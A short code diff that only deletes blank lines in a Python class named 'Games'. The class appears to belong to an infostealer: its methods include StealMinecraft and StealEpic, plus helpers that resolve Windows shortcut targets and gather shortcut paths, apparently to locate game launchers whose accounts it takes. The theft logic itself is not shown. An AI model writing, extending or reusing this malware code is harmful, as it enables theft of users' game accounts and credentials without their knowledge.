@@ -9,8 +9,6 @@ class Games:
         self.StealMinecraft()
         
 
-
-
     def GetLnkTarget(self, path_to_lnk: str) -> str | None:
         target = None
         if os.path.isfile(path_to_lnk):
@@ -36,7 +34,6 @@ class Games:
                         shortcutPaths.append(os.path.join(root, file))       
         return shortcutPaths
     
-
 
     def StealEpic(self) -> None:
         if True:
